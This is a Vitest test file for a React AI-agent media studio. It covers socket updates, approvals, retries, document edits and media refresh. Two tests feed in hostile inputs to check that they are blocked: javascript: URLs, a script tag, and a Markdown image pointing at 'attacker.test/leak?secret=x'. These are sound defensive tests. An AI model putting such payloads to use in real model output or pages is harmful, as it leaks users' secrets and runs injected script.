import { act, fireEvent, render, screen, waitFor } from '@testing-library/react'
import { beforeEach, describe, expect, it, vi } from 'vitest'
import { http, HttpResponse } from 'msw'
import { server } from './mocks/server'
import DeepAgentStudio from '@/components/director/DeepAgentStudio'
import { DocumentEditor, Markdown, EventCard } from '@/components/director/StudioCards'
import { Media, StudioMediaContext } from '@/components/director/StudioMedia'
import { applyStudioFrame, createStudioAPI, defaultModel, mediaURLs } from '@/components/director/studio'
import type { StudioRun, StudioDocument } from '@/components/director/studio'

const catalog = {
  models: [
    { id: 29, model: 'banana-pro', display_name: 'Nano Banana Pro (Google)', operation_codes: ['image.text_to_image'] },
    { id: 18, model: 'seedance-2.5', display_name: 'Seedance 2.5', operation_codes: ['video.generate'] },
  ],
  skills: [{ id: 1, name: 'director', description: '故事导演' }],
  planning_model: { id: 21, model: 'Qwen3.8-Max', operation_codes: [] },
}
function snapshot(overrides: Partial<StudioRun> = {}): StudioRun {
  return {
    id: 'run1',
    cursor: 7,
    status: 'complete',
    title: '第一集测试',
    events: [],
    selection: { image: 29, video: 18, mode: 'manual' },
    documents: [],
    batches: [],
    ...overrides,
  }
}
class Socket {
  static instances: Socket[] = []
  onopen?: () => void
  onmessage?: (event: { data: string }) => void
  onclose?: (event: { code: number }) => void
  close = vi.fn()
  constructor(public url: string) {
    Socket.instances.push(this)
  }
  emit(data: unknown) {
    this.onmessage?.({ data: JSON.stringify(data) })
  }
}
beforeEach(() => {
  Socket.instances = []
  vi.stubGlobal('WebSocket', Socket)
  HTMLDialogElement.prototype.showModal = function () {
    this.setAttribute('open', '')
  }
  HTMLDialogElement.prototype.close = function () {
    this.removeAttribute('open')
  }
  server.use(
    http.get('*/agent-studio/', () => new HttpResponse('studio')),
    http.get('*/agent-studio/api/state', () =>
      HttpResponse.json({
        connected: true,
        workspace_id: 54,
        runs: [{ id: 'run1', title: '第一集测试', status: 'complete' }],
      }),
    ),
    http.get('*/agent-studio/api/catalog', () => HttpResponse.json(catalog)),
    http.get('*/agent-studio/api/runs/run1', () => HttpResponse.json(snapshot())),
  )
})
async function openHistory() {
  await waitFor(() => expect(screen.getByText('图片 · Nano Banana Pro (Google)')).toBeInTheDocument())
  fireEvent.click(screen.getByRole('button', { name: '新对话' }))
  fireEvent.click(screen.getByRole('button', { name: /第一集测试/ }))
  await waitFor(() => expect(Socket.instances.length).toBe(1))
}

describe('Studio transport', () => {
  it('only accepts a same-origin mount and keeps cookie credentials out of socket URLs', () => {
    expect(() => createStudioAPI('https://other.test')).toThrow()
    expect(() => createStudioAPI('//other.test')).toThrow()
    const url = new URL(createStudioAPI().socketURL('a/b', 12))
    expect(url.pathname).toBe('/agent-studio/api/runs/a%2Fb/ws')
    expect(url.search).toBe('?after=12')
    expect(defaultModel(catalog, 'image')).toBe(29)
    expect(defaultModel(catalog, 'video')).toBe(18)
  })
  it('deduplicates replayed tasks and replaces billing snapshots', () => {
    let run = snapshot({ status: 'running', events: [{ id: 'task-1', kind: 'cost', text: 'running' }] })
    const event = {
      event: 'update',
      cursor: 8,
      data: {
        run_id: 'run1',
        type: 'TASK_UPDATED',
        data: { id: 'task-1', kind: 'cost', text: 'done', data: { status: 'succeeded', actual_cost: 4 } },
      },
    }
    run = applyStudioFrame(run, event)
    expect(run.events).toHaveLength(1)
    expect(run.events[0].text).toBe('done')
    expect(applyStudioFrame(run, event)).toBe(run)
    expect(applyStudioFrame(run, { ...event, cursor: 9, data: { ...event.data, run_id: 'other' } })).toBe(run)
    run = applyStudioFrame(run, {
      event: 'update',
      cursor: 10,
      data: { run_id: 'run1', type: 'ACTIVITY_SNAPSHOT', data: { settled_credits: '4.000' } },
    })
    run = applyStudioFrame(run, {
      event: 'update',
      cursor: 11,
      data: { run_id: 'run1', type: 'ACTIVITY_SNAPSHOT', data: { settled_credits: '5.000' } },
    })
    expect(run.billing?.settled_credits).toBe('5.000')
    expect(
      mediaURLs({
        assets: [{ download_url: 'javascript:alert(1)' }, { download_url: 'https://example.test/image.png' }],
      }),
    ).toEqual(['https://example.test/image.png'])
  })
  it('keeps events when RUN_STATE finishes and does not infer delivery success', () => {
    const run = snapshot({ status: 'running', events: [{ id: 'task', kind: 'cost', text: 'done' }] })
    const next = applyStudioFrame(run, {
      event: 'update',
      cursor: 8,
      data: { run_id: 'run1', type: 'RUN_STATE', data: { status: 'complete' } },
    })
    expect(next.events).toEqual(run.events)
    expect(next.status).toBe('complete')
    expect(next.canvas).toBeUndefined()
  })
})

describe('Director interactions', () => {
  it('uses the selected models and mode only after explicit send; unselected skill stays private', async () => {
    const starts: unknown[] = []
    server.use(
      http.post('*/agent-studio/api/runs', async ({ request }) => {
        expect(request.headers.get('X-Agent-Request')).toBe('1')
        starts.push(await request.json())
        return HttpResponse.json({ id: 'run1' })
      }),
    )
    render(<DeepAgentStudio />)
    await waitFor(() => expect(screen.getByText('图片 · Nano Banana Pro (Google)')).toBeInTheDocument())
    expect(screen.queryByText(/内置 Skill|默认 Skill/)).not.toBeInTheDocument()
    fireEvent.click(screen.getByRole('button', { name: '手动确认' }))
    fireEvent.click(screen.getByRole('button', { name: /自动生成.*按你的要求/ }))
    expect(starts).toHaveLength(0)
    fireEvent.change(screen.getByRole('textbox', { name: '创作要求' }), { target: { value: '只制作第一集' } })
    fireEvent.click(screen.getByRole('button', { name: '发送创作要求' }))
    await waitFor(() => expect(starts).toHaveLength(1))
    expect(starts[0]).toMatchObject({
      message: '只制作第一集',
      selection: { image: 29, video: 18, mode: 'auto' },
      skill: '',
      attachments: [],
    })
  })
  it('shows structured approval and sends the exact decision ID, not a new run', async () => {
    const decisions: unknown[] = []
    server.use(
      http.get('*/agent-studio/api/runs/run1', () =>
        HttpResponse.json(
          snapshot({
            status: 'waiting',
            decision_id: 'approval-one',
            pending: {
              tool: 'production.generate_batch',
              message: '确认生成五张图，共 75 积分',
              arguments: { batch_id: 'batch-1' },
            },
          }),
        ),
      ),
      http.post('*/agent-studio/api/runs/run1/resume', async ({ request }) => {
        decisions.push(await request.json())
        return HttpResponse.json({ ok: true })
      }),
    )
    render(<DeepAgentStudio />)
    await openHistory()
    expect(screen.getByText('确认生成五张图，共 75 积分')).toBeInTheDocument()
    expect(decisions).toHaveLength(0)
    fireEvent.click(screen.getByRole('button', { name: '确认并继续' }))
    await waitFor(() => expect(decisions).toHaveLength(1))
    expect(decisions[0]).toEqual({
      decision_id: 'approval-one',
      decision: 'approve',
      message: '用户确认继续',
      arguments: { batch_id: 'batch-1' },
    })
  })
  it('reconnect updates keep one task card and canvas callback; switching closes the socket', async () => {
    const onCanvasChange = vi.fn()
    render(<DeepAgentStudio onCanvasChange={onCanvasChange} />)
    await openHistory()
    const socket = Socket.instances[0]
    act(() => {
      const update = {
        event: 'update',
        cursor: 8,
        data: {
          run_id: 'run1',
          type: 'TASK_UPDATED',
          data: {
            id: 't1',
            kind: 'cost',
            text: '图片完成',
            data: { status: 'succeeded', tool: 'model.generate_image', actual_cost: 5 },
          },
        },
      }
      socket.emit(update)
      socket.emit(update)
      socket.emit({
        event: 'update',
        cursor: 9,
        data: {
          run_id: 'run1',
          type: 'CANVAS_UPDATED',
          data: {
            id: 'canvas-1',
            kind: 'canvas',
            text: '画布已同步',
            data: { canvas_id: 35, nodes: [{ id: 'node-1' }] },
          },
        },
      })
    })
    expect(screen.getAllByText('生成图片')).toHaveLength(1)
    expect(onCanvasChange).toHaveBeenCalledWith({ canvas_id: 35, nodes: [{ id: 'node-1' }] })
    fireEvent.click(screen.getByRole('button', { name: '新建会话' }))
    expect(socket.close).toHaveBeenCalled()
    act(() =>
      socket.emit({
        event: 'snapshot',
        cursor: 10,
        data: snapshot({ events: [{ id: 'late', kind: 'assistant', text: '旧会话迟到响应' }] }),
      }),
    )
    expect(screen.queryByText('旧会话迟到响应')).not.toBeInTheDocument()
  })
  it('blocks wrong-workspace writes before a canvas can be used', async () => {
    render(<DeepAgentStudio workspaceId={99} canvasId={35} />)
    await screen.findByText(/当前 MCP 授权空间与页面不同/)
    expect(screen.getByRole('button', { name: '发送创作要求' })).toBeDisabled()
  })
  it('explicit inference retry preserves task identity and successful results', async () => {
    const decisions: unknown[] = []
    server.use(
      http.get('*/agent-studio/api/runs/run1', () =>
        HttpResponse.json(
          snapshot({
            status: 'error',
            inference_failure: { task_id: 4362, retryable: true },
            events: [
              {
                id: 'good-image',
                kind: 'cost',
                text: '图片完成',
                data: { tool: 'model.generate_image', status: 'succeeded', actual_cost: 15 },
              },
            ],
          }),
        ),
      ),
      http.post('*/agent-studio/api/runs/run1/resume', async ({ request }) => {
        decisions.push(await request.json())
        return HttpResponse.json({ ok: true })
      }),
    )
    render(<DeepAgentStudio />)
    await openHistory()
    fireEvent.click(screen.getByRole('button', { name: /重试这次推理/ }))
    await waitFor(() => expect(decisions).toEqual([{ retry_inference_task_id: 4362 }]))
    expect(screen.getByText('生成图片')).toBeInTheDocument()
  })
})

describe('Studio concurrency and content boundaries', () => {
  it('partial state frames preserve recovery metadata and stale snapshots cannot rewind progress', () => {
    const run = snapshot({ active_batch: 'batch-7', inference_failure: { task_id: 4362, retryable: true } })
    const next = applyStudioFrame(run, {
      event: 'update',
      cursor: 9,
      data: { run_id: 'run1', type: 'RUN_STATE', data: { status: 'paused', stop: true, pending: null } },
    })
    expect(next.active_batch).toBe('batch-7')
    expect(next.inference_failure?.task_id).toBe(4362)
    expect(next.status).toBe('paused')
    expect(applyStudioFrame(next, { event: 'snapshot', cursor: 8, data: snapshot({ status: 'running' }) })).toBe(next)
  })
  it('saves the editing-base revision after a concurrent document update, retaining the draft', async () => {
    const save = vi.fn(async (_doc: StudioDocument, _body: string, _key: string) => {})
    const original = { id: 'doc1', title: '分镜', kind: 'storyboard', revision: 1, body: '原始正文' }
    const view = render(<DocumentEditor document={original} busy={false} onSave={save} />)
    fireEvent.click(screen.getByRole('button', { name: '编辑文档' }))
    fireEvent.change(screen.getByRole('textbox', { name: '制作文档正文' }), { target: { value: '我的未保存改动' } })
    view.rerender(
      <DocumentEditor
        document={{ ...original, revision: 2, body: '另一位操作者的新正文' }}
        busy={false}
        onSave={save}
      />,
    )
    expect(screen.getByRole('textbox', { name: '制作文档正文' })).toHaveValue('我的未保存改动')
    expect(screen.getByRole('status')).toHaveTextContent('当前草稿仍基于版本 1')
    fireEvent.click(screen.getByRole('button', { name: '保存修订' }))
    await waitFor(() => expect(save).toHaveBeenCalledTimes(1))
    expect(save.mock.calls[0][0]).toMatchObject({ id: 'doc1', revision: 1 })
    expect(save.mock.calls[0][1]).toBe('我的未保存改动')
  })
  it('does not execute model HTML or automatically fetch model-authored Markdown images', () => {
    const view = render(
      <Markdown>
        {'![private](https://attacker.test/leak?secret=x) <script>alert(1)</script> [bad](javascript:alert(1))'}
      </Markdown>,
    )
    expect(view.container.querySelector('img,script,iframe')).toBeNull()
    expect(view.container.querySelector('a')?.getAttribute('href') || '').not.toMatch(/^javascript:/)
    expect(view.container).toHaveTextContent('private')
  })
  it('allows stopping while an earlier resume HTTP request is still outstanding', async () => {
    let release: () => void = () => {}
    const pending = new Promise<void>((resolve) => {
      release = resolve
    })
    const resumes: unknown[] = [],
      stops: unknown[] = []
    server.use(
      http.get('*/agent-studio/api/runs/run1', () => HttpResponse.json(snapshot({ status: 'error' }))),
      http.post('*/agent-studio/api/runs/run1/resume', async ({ request }) => {
        resumes.push(await request.json())
        await pending
        return HttpResponse.json({ ok: true })
      }),
      http.post('*/agent-studio/api/runs/run1/stop', async ({ request }) => {
        stops.push(await request.json())
        return HttpResponse.json({ ok: true })
      }),
    )
    render(<DeepAgentStudio />)
    await openHistory()
    fireEvent.click(screen.getByRole('button', { name: '恢复执行 / 查询已有任务' }))
    await waitFor(() => expect(resumes).toHaveLength(1))
    act(() =>
      Socket.instances[0].emit({
        event: 'update',
        cursor: 8,
        data: { run_id: 'run1', type: 'RUN_STATE', data: { status: 'running', stop: false } },
      }),
    )
    const stop = screen.getByRole('button', { name: '停止后续执行' })
    expect(stop).not.toBeDisabled()
    fireEvent.click(stop)
    await waitFor(() => expect(stops).toEqual([{}]))
    release()
  })
})

describe('Media and activity recovery', () => {
  it('uses refreshed canvas URLs and never leaves a stateless progress note spinning', () => {
    expect(
      mediaURLs(
        { assets: [{ id: 12, download_url: 'https://media.test/old.png' }] },
        { nodes: [{ asset_id: 12, url: 'https://media.test/fresh.png' }] },
      ),
    ).toEqual(['https://media.test/fresh.png'])
    render(<EventCard event={{ id: 'notice', kind: 'progress', text: '参考素材已通过审核' }} />)
    expect(screen.getByText('参考素材已通过审核')).toBeInTheDocument()
    expect(screen.queryByText('处理中')).not.toBeInTheDocument()
  })
  it('refreshes an expired asset once automatically and permits an explicit read-only refresh', async () => {
    const refresh = vi.fn(async (_id: number) => ({ id: 12, download_url: 'https://media.test/fresh.png' }))
    render(
      <StudioMediaContext.Provider value={{ refresh }}>
        <Media data={{ assets: [{ id: 12, download_url: 'https://media.test/old.png' }] }} />
      </StudioMediaContext.Provider>,
    )
    fireEvent.error(screen.getByRole('img', { name: '生成素材' }))
    await waitFor(() =>
      expect(screen.getByRole('img', { name: '生成素材' })).toHaveAttribute('src', 'https://media.test/fresh.png'),
    )
    expect(refresh).toHaveBeenCalledWith(12)
    fireEvent.error(screen.getByRole('img', { name: '生成素材' }))
    expect(refresh).toHaveBeenCalledTimes(1)
    fireEvent.click(screen.getByRole('button', { name: '刷新素材链接' }))
    await waitFor(() => expect(refresh).toHaveBeenCalledTimes(2))
  })
})
